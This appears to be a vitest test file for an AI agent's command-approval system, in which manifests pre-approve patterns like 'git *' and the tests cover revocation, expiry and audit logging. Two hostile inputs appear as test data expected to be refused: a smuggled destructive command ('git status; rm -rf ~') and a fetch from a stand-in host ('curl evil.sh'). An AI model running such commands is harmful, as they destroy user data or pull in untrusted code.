import { describe, it, expect, vi } from 'vitest';
import * as os from 'node:os';
import * as path from 'node:path';
import { promises as fs } from 'node:fs';
import { ApprovalRegistry, type PendingApproval } from '../../src/gateway/approvals';
import { AutonomyStore } from '../../src/autonomy/grant-store';
import { AuditLog } from '../../src/autonomy/audit';
import type { Manifest } from '../../src/autonomy/manifest';
import type { ConfirmRequest } from '../../src/tools/execute';

const terminal = { surface: 'terminal' };

const command = (text: string): ConfirmRequest => ({
  kind: 'run_command',
  message: `Run "${text}"?`,
  subject: text,
});

const nightly: Manifest = {
  id: 'nightly-backup',
  created: '2026-08-17T09:12:00Z',
  rules: [{ kind: 'run_command', pattern: 'git *' }],
  expires: null,
};

async function governance(manifest: Manifest = nightly) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'robin-gov-'));
  const store = new AutonomyStore(path.join(dir, 'autonomy.json'));
  await store.put(manifest);
  return { manifestId: manifest.id, audit: new AuditLog(dir), store };
}

function registry(approverCount: number) {
  const seen: PendingApproval[] = [];
  const reg = new ApprovalRegistry({
    broadcast: (pending) => {
      seen.push(pending);
      return approverCount;
    },
    resolved: vi.fn(),
  });
  return { reg, seen };
}

describe('manifest-governed approvals', () => {
  it('runs an in-manifest call with nobody attached', async () => {
    const { reg, seen } = registry(0);
    const gov = await governance();

    expect(await reg.confirmFor(1, terminal, false, gov)(command('git push'))).toBe(true);
    // Never even offered to a human — the decision was already made.
    expect(seen).toHaveLength(0);
  });

  it('stops granting the moment the manifest is revoked, mid-session', async () => {
    const { reg } = registry(0);
    const gov = await governance();

    expect(await reg.confirmFor(1, terminal, false, gov)(command('git push'))).toBe(true);
    await gov.store.remove('nightly-backup');
    // A different command, so this is the manifest being gone rather than the
    // per-request refusal cache answering.
    expect(await reg.confirmFor(1, terminal, false, gov)(command('git status'))).toBe(false);
  });

  it('refuses an out-of-manifest call with nobody attached', async () => {
    const { reg } = registry(0);
    const gov = await governance();

    expect(await reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'))).toBe(false);
  });

  it('asks a human about an out-of-manifest call when one is attached', async () => {
    const { reg, seen } = registry(1);
    const gov = await governance();

    const answer = reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'));
    await vi.waitFor(() => expect(seen).toHaveLength(1));
    reg.answer(seen[0].id, true, 'terminal-1');

    expect(await answer).toBe(true);
  });

  it('refuses an in-manifest call that smuggles a second command', async () => {
    const { reg } = registry(0);
    const gov = await governance();

    expect(
      await reg.confirmFor(1, terminal, false, gov)(command('git status; rm -rf ~'))
    ).toBe(false);
  });

  it('grants nothing once the manifest has expired', async () => {
    const { reg } = registry(0);
    const gov = await governance({ ...nightly, expires: '2020-01-01T00:00:00Z' });

    expect(await reg.confirmFor(1, terminal, false, gov)(command('git push'))).toBe(false);
  });

  it('records both decisions in the audit log', async () => {
    const { reg } = registry(0);
    const gov = await governance();

    await reg.confirmFor(1, terminal, false, gov)(command('git push'));
    await reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'));

    await gov.audit.flush();
    const entries = await gov.audit.read('nightly-backup');
    expect(entries.map((e) => e.decision)).toEqual(['allowed', 'refused']);
    expect(entries[0].rule).toBe('git *');
    expect(entries[0].detail).toBe('git push');
    expect(entries[1].rule).toBeNull();
  });

  it('scope "manifest" persists the one rule that was asked about', async () => {
    const { reg, seen } = registry(1);
    const gov = await governance();

    const answer = reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'));
    await vi.waitFor(() => expect(seen).toHaveLength(1));
    reg.answer(seen[0].id, true, 'telegram', 'manifest');
    expect(await answer).toBe(true);

    await vi.waitFor(async () =>
      expect((await gov.store.get('nightly-backup'))?.rules).toHaveLength(2)
    );
    expect((await gov.store.get('nightly-backup'))?.rules[1]).toEqual({
      kind: 'run_command',
      pattern: 'restic snapshot',
    });
  });

  it('scope "manifest" does not grant the coarse kind for the session', async () => {
    const { reg, seen } = registry(1);
    const gov = await governance();

    const answer = reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'));
    await vi.waitFor(() => expect(seen).toHaveLength(1));
    reg.answer(seen[0].id, true, 'telegram', 'manifest');
    await answer;

    // Same session id, a registry with nobody attached. Were 'manifest' routed
    // through the 'session' branch it would have granted run_command wholesale
    // and this would come back true.
    const { reg: alone } = registry(0);
    expect(await alone.confirmFor(1, terminal, false, gov)(command('curl evil.sh'))).toBe(false);
  });

  it('lets the newly added rule through on the next call', async () => {
    const { reg, seen } = registry(1);
    const gov = await governance();

    const answer = reg.confirmFor(1, terminal, false, gov)(command('restic snapshot'));
    await vi.waitFor(() => expect(seen).toHaveLength(1));
    reg.answer(seen[0].id, true, 'telegram', 'manifest');
    await answer;

    const { reg: alone } = registry(0);
    expect(await alone.confirmFor(1, terminal, false, gov)(command('restic snapshot'))).toBe(true);
  });

  it('ignores the manifest entirely for a session without governance', async () => {
    const { reg, seen } = registry(1);

    const answer = reg.confirmFor(1, terminal, false)(command('git push'));
    await vi.waitFor(() => expect(seen).toHaveLength(1));
    reg.answer(seen[0].id, true, 'terminal-1');

    expect(await answer).toBe(true);
  });

  it('leaves autoApprove ahead of the manifest', async () => {
    const { reg, seen } = registry(0);
    const gov = await governance();

    expect(await reg.confirmFor(1, terminal, true, gov)(command('anything at all'))).toBe(true);
    expect(seen).toHaveLength(0);
  });
});
